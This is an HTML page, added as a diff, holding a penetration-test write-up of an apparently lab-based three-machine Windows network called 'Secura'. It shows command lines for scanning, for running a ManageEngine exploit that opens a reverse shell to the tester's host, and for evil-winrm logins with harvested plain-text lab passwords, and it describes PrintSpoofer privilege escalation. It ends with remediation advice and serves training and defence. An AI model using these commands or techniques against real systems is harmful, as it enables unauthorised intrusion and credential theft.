@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secura Challenge Writeup | Josh Chalabi</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-black': '#0b1020',
+                        'cyber-gray': '#0f1733',
+                        'cyber-green': '#5eead4',
+                        'cyber-green-dim': 'rgba(94, 234, 212, 0.1)',
+                        'cyber-purple': '#a78bfa',
+                        'cyber-red': '#ff003c',
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        tech: ['"Share Tech Mono"', 'monospace'],
+                    },
+                    boxShadow: {
+                        'neon': '0 0 10px rgba(94, 234, 212, 0.5), 0 0 20px rgba(94, 234, 212, 0.3)',
+                        'card': '0 4px 6px -1px rgba(0, 0, 0, 0.5), 0 2px 4px -1px rgba(0, 0, 0, 0.3)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b1020;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1f2942;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #5eead4;
+        }
+
+        /* Syntax Highlighting Base */
+        .code-block {
+            background-color: #080c19;
+            border: 1px solid #1f2942;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            overflow-x: auto;
+            color: #e2e8f0;
+        }
+        .cmd-prompt { color: #5eead4; }
+        .cmd-arg { color: #a78bfa; }
+
+        /* Image Lightbox */
+        .lightbox {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s;
+        }
+        .lightbox img {
+            max-width: 90%;
+            max-height: 90%;
+            border: 2px solid #5eead4;
+            box-shadow: 0 0 20px rgba(94, 234, 212, 0.3);
+        }
+        .lightbox-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: #fff;
+            font-size: 40px;
+            cursor: pointer;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .zoomable-img {
+            cursor: zoom-in;
+            transition: transform 0.2s;
+        }
+        .zoomable-img:hover {
+            transform: scale(1.02);
+            border-color: #5eead4;
+        }
+    </style>
+</head>
+<body class="bg-cyber-black text-gray-300 font-sans min-h-screen flex flex-col">
+
+    <!-- Navigation -->
+    <nav class="border-b border-[#1f2942] bg-[#0b1020]/90 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <!-- Logo -->
+                <div class="flex-shrink-0 flex items-center space-x-3">
+                    
+                    <div class="flex-shrink-0">
+                        <a href="index.html" class="text-2xl font-bold text-cyber-green font-tech tracking-wider">&lt;josh/&gt;</a>
+                    </div>
+                </div>
+
+                <!-- Desktop Menu -->
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8 font-mono text-sm">
+                        
+                        <a href="/reports.html" class="text-cyber-green bg-cyber-green-dim px-3 py-2 rounded-md border border-cyber-green/30 shadow-neon">
+                            <i class="fas fa-file-code mr-2"></i>Reports
+                        </a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow max-w-5xl mx-auto px-4 py-12 w-full">
+        
+        <!-- Header Section -->
+        <div class="mb-10 border-b border-[#1f2942] pb-6">
+            <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
+                <div>
+                    <div class="flex items-center gap-3 mb-2">
+                        <span class="px-3 py-1 text-xs font-bold text-black bg-cyber-green rounded-full font-mono">COMPLETED</span>
+                        <span class="text-gray-400 font-mono text-sm"><i class="far fa-calendar-alt mr-2"></i>July 2025</span>
+                    </div>
+                    <h1 class="text-3xl md:text-4xl font-bold text-white font-tech mb-2">Secura Challenge Penetration Test</h1>
+                    <p class="text-gray-400">A comprehensive security assessment of a 3-node internal network.</p>
+                </div>
+                <div class="flex gap-2">
+                    <a href="reports.html" class="px-4 py-2 border border-[#1f2942] rounded hover:bg-[#1f2942] transition-colors text-sm font-mono">
+                        <i class="fas fa-arrow-left mr-2"></i>Back to Reports
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Target Scope -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-10">
+            <div class="bg-[#0f1733] border border-[#1f2942] p-4 rounded-lg flex items-center justify-between">
+                <div>
+                    <h3 class="text-gray-400 text-xs font-mono uppercase">Target 1</h3>
+                    <p class="text-cyber-green font-bold font-mono">192.168.118.95</p>
+                </div>
+                <i class="fas fa-server text-[#1f2942] text-2xl"></i>
+            </div>
+            <div class="bg-[#0f1733] border border-[#1f2942] p-4 rounded-lg flex items-center justify-between">
+                <div>
+                    <h3 class="text-gray-400 text-xs font-mono uppercase">Target 2</h3>
+                    <p class="text-cyber-green font-bold font-mono">192.168.118.96</p>
+                </div>
+                <i class="fas fa-network-wired text-[#1f2942] text-2xl"></i>
+            </div>
+            <div class="bg-[#0f1733] border border-[#1f2942] p-4 rounded-lg flex items-center justify-between">
+                <div>
+                    <h3 class="text-gray-400 text-xs font-mono uppercase">Target 3</h3>
+                    <p class="text-cyber-green font-bold font-mono">192.168.118.97</p>
+                </div>
+                <i class="fas fa-laptop-code text-[#1f2942] text-2xl"></i>
+            </div>
+        </div>
+
+        <!-- Executive Summary -->
+        <section class="mb-12">
+            <h2 class="text-2xl text-white font-tech mb-4 border-l-4 border-cyber-green pl-4">1. Executive Summary</h2>
+            <div class="bg-[#0f1733]/50 p-6 rounded-lg border border-[#1f2942] text-gray-300 leading-relaxed">
+                <p class="mb-4">
+                    The assessment focused on the "Secura" system, comprising three interconnected virtual machines (192.168.118.95, .96, and .97). The objective was to identify vulnerabilities, exploit them to gain access, and escalate privileges across the network.
+                </p>
+                <p>
+                    The attack chain began with a full port scan across all targets. The initial foothold was established on <strong>192.168.118.95</strong> by exploiting a remote code execution (RCE) vulnerability in a ManageEngine Applications Manager instance running on port 44444, leveraging weak credentials (admin:admin).
+                </p>
+                <p>
+                    Lateral movement was achieved by discovering hardcoded credentials in an RDCMan configuration file, granting access to the second machine (192.168.118.96). Further enumeration revealed sensitive credentials stored in a MySQL data file, which facilitated administrative access to the second machine and user access to the third (192.168.118.97). The final privilege escalation to SYSTEM was achieved by exploiting the <code class="text-cyber-purple">SeImpersonatePrivilege</code> using PrintSpoofer.
+                </p>
+            </div>
+        </section>
+
+        <!-- Phase 1: Recon -->
+        <section class="mb-12">
+            <h2 class="text-2xl text-white font-tech mb-4 border-l-4 border-cyber-green pl-4">2. Reconnaissance & Enumeration</h2>
+            <p class="mb-4">
+                I initiated the engagement by scanning all ports and services on the target scope. The detailed Nmap output files are stored in the evidence directory as <code>all_ports_vm*.md</code> and <code>services_vm*.xml</code>.
+            </p>
+            <div class="code-block mb-4">
+                <span class="cmd-prompt">josh@csec:~$</span> nmap -p- -sC -sV -oN all_ports_vm3.md 192.168.118.95
+            </div>
+            <p>
+                Scanning revealed a web service running on port <strong>44444</strong> on the .95 machine. This was identified as <strong>ManageEngine Applications Manager</strong>.
+            </p>
+        </section>
+
+        <!-- Phase 2: Initial Foothold -->
+        <section class="mb-12">
+            <h2 class="text-2xl text-white font-tech mb-4 border-l-4 border-cyber-green pl-4">3. Initial Foothold (192.168.118.95)</h2>
+            <p class="mb-4">
+                Upon accessing the web interface on port 44444, I attempted default credentials. The application was misconfigured with weak credentials, allowing authenticated access via <code>admin:admin</code>.
+            </p>
+            <p class="mb-4">
+                Further enumeration of the dashboard revealed the build version to be <strong>14710</strong>.
+            </p>
+            
+            <!-- Image Block -->
+            <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/Manage_Engine_version_14.png" alt="Manage Engine Version 14" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 1: ManageEngine Version Identification</p>
+            </div>
+
+            <p class="mb-4">
+                A search for known vulnerabilities (<code>searchsploit</code>) identified an authenticated RCE exploit for this version. However, the available exploit relied on an older version of the Java compiler and JAR libraries, causing it to fail. I modified the exploit code to be compatible with the modern environment.
+            </p>
+            <div class="code-block mb-4">
+                <span class="cmd-prompt">josh@csec:~$</span> python3 manageengine_14.py http:192.168.118.95 admin admin 192.168.45.233 80
+            </div>
+            <p class="mb-4">
+                The execution was successful, resulting in a reverse shell with <strong>Administrator</strong> privileges on the first machine.
+            </p>
+        </section>
+
+        <!-- Phase 3: Lateral Movement -->
+        <section class="mb-12">
+            <h2 class="text-2xl text-white font-tech mb-4 border-l-4 border-cyber-green pl-4">4. Lateral Movement to 192.168.118.96</h2>
+            <p class="mb-4">
+                During post-exploitation enumeration on the .95 machine, I inspected the user directories. I discovered an interesting configuration file for "Remote Desktop Connection Manager" (RDCMan) located at:
+                <br><code class="text-cyber-green text-sm bg-black/30 px-2 py-1 rounded">C:\Users\Administrator\AppData\Microsoft\Remote Desktop Connection Manager\RDCMan.settings</code>
+            </p>
+            
+            <!-- Image Block -->
+            <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/RDCMan_Settings_creds_leak.png" alt="RDCMan Settings Creds Leak" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 2: Leaked Credentials in RDCMan settings</p>
+            </div>
+
+             <p class="mb-4">
+                Reading this file revealed plain-text credentials for a user named <strong>apache</strong>: <code>New2Era4.!</code>. Using <code>evil-winrm</code>, I successfully authenticated to the second machine (192.168.118.96).
+            </p>
+            <div class="code-block mb-4">
+                <span class="cmd-prompt">josh@csec:~$</span> evil-winrm -i 192.168.118.96 -u apache -p 'New2Era4.!'
+            </div>
+            
+        </section>  
+        <!-- Phase 4: Data Exfiltration & Pivoting -->
+        <section class="mb-12">
+            <h2 class="text-2xl text-white font-tech mb-4 border-l-4 border-cyber-green pl-4">5. Credential Harvesting (MySQL)</h2>
+            <p class="mb-4">
+                While exploring the file system of the second machine, I located a MySQL data directory containing a suspicious file:
+                <br><code class="text-cyber-green text-sm bg-black/30 px-2 py-1 rounded">C:\xampp\mysql\data\creds\creds.ibd</code>
+            </p>
+            <p class="mb-4">
+                Analyzing this database file revealed critical passwords for the infrastructure:
+            </p>
+            <ul class="list-disc list-inside text-gray-400 mb-4 ml-4 space-y-2">
+                <li><span class="text-cyber-purple font-mono">Administrator</span> (Current Machine): <code>Almost4There8.?</code></li>
+                <li><span class="text-cyber-purple font-mono">charlotte</span> (Next Machine): <code>Game20n4.!</code></li>
+            </ul>
+
+            <!-- Image Block -->
+            <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/mysql_creds_leak.png" alt="MySQL Creds Leak" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 4: Extracted credentials from MySQL .ibd file</p>
+            </div>
+
+            <p class="mb-4">
+                With the Administrator password found, I re-authenticated to 192.168.118.96 as Administrator and captured the <code>proof.txt</code>.
+            </p>
+
+             <!-- Image Block -->
+             <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/privileged_user_login_on_192.168.118.96.png" alt="Login on VM2" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 3: Successful Access to 192.168.118.96</p>
+            </div>
+        
+
+        </section>
+
+        <!-- Phase 5: Final Target & PrivEsc -->
+        <section class="mb-12">
+            <h2 class="text-2xl text-white font-tech mb-4 border-l-4 border-cyber-green pl-4">6. Final Target & Privilege Escalation (192.168.118.97)</h2>
+            <p class="mb-4">
+                Using the credentials extracted from the previous step (<code>charlotte:Game20n4.!</code>), I accessed the final machine via Evil-WinRM.
+            </p>
+
+           
+            
+            <!-- Image Block -->
+            <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/charlotte_login_on_192.168.118.97.png" alt="Charlotte Login" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 5: User Access on 192.168.118.97</p>
+            </div>
+
+            <p class="mb-4">
+                To identify escalation paths, I checked the current user's privileges using <code>whoami /priv</code>. The output confirmed that the <strong>SeImpersonatePrivilege</strong> was enabled.
+            </p>
+
+             <!-- Image Block -->
+             <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/priv_check_on_192.168.118.97.png" alt="Privilege Check" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 6: Detecting SeImpersonatePrivilege</p>
+            </div>
+
+            <p class="mb-4">
+                This privilege is vulnerable to the "Potato" family of exploits. I uploaded the <strong>PrintSpoofer.exe</strong> tool to the target machine.
+            </p>
+
+            <!-- Image Block -->
+            <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/download_printspoofer.png" alt="Download PrintSpoofer" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 7: Transferring exploit tools</p>
+            </div>
+
+            <p class="mb-4">
+                Executing PrintSpoofer allowed me to hijack the service token and execute a command as <strong>NT AUTHORITY\SYSTEM</strong>. I used this to read the final <code>proof.txt</code> from the Administrator's desktop.
+            </p>
+             <!-- Image Block -->
+             <div class="mb-6 bg-[#0f1733] p-2 rounded border border-[#1f2942]">
+                <img src="images/proof_privesc_via_printspoofer.png" alt="Root Proof" class="w-full h-auto rounded border border-[#1f2942] zoomable-img" onclick="openLightbox(this)">
+                <p class="text-center text-xs text-gray-500 mt-2 font-mono">Figure 8: Successful Privilege Escalation to SYSTEM</p>
+            </div>
+        </section>
+
+        <!-- Conclusion -->
+        <section class="mb-12 border-t border-[#1f2942] pt-8">
+            <h2 class="text-xl text-white font-tech mb-4">Conclusion & Recommendations</h2>
+            <p class="text-gray-400 mb-2">
+                The Secura system was fully compromised due to a combination of outdated software (ManageEngine), weak password policies (admin:admin), and insecure storage of credentials (RDCMan, MySQL).
+            </p>
+            <p class="text-gray-400">
+                <strong>Key Remediation Steps:</strong>
+                <ul class="list-disc list-inside mt-2 ml-4 space-y-1">
+                    <li>Update ManageEngine Applications Manager to the latest secure version.</li>
+                    <li>Enforce strong password policies and disable default accounts.</li>
+                    <li>Clear plain-text credentials from configuration files and databases.</li>
+                    <li>Audit user privileges and disable <code>SeImpersonatePrivilege</code> for service accounts where not strictly necessary.</li>
+                </ul>
+            </p>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-black border-t border-[#23305f] py-8 mt-auto relative">
+        <div class="max-w-7xl mx-auto px-4 text-center">
+            <p class="text-gray-600 text-sm font-mono">
+                &copy; 2025 Josh Chalabi. All systems secure... for now.
+            </p>
+            <div class="mt-4 flex justify-center space-x-6 text-gray-500">
+                <a href="#" class="hover:text-cyber-green transition-colors"><i class="fab fa-github text-xl"></i></a>
+                <a href="#" class="hover:text-cyber-green transition-colors"><i class="fab fa-twitter text-xl"></i></a>
+                <a href="#" class="hover:text-cyber-green transition-colors"><i class="fab fa-linkedin text-xl"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Lightbox Modal -->
+    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+        <span class="lightbox-close">&times;</span>
+        <img id="lightbox-img" src="" alt="Full screen image">
+    </div>
+
+    <script>
+        function openLightbox(imgElement) {
+            const lightbox = document.getElementById('lightbox');
+            const lightboxImg = document.getElementById('lightbox-img');
+            lightboxImg.src = imgElement.src;
+            lightbox.style.display = 'flex';
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox').style.display = 'none';
+        }
+
+        // Close on Escape key
+        document.addEventListener('keydown', function(event) {
+            if (event.key === "Escape") {
+                closeLightbox();
+            }
+        });
+    </script>
+</body>
+</html>
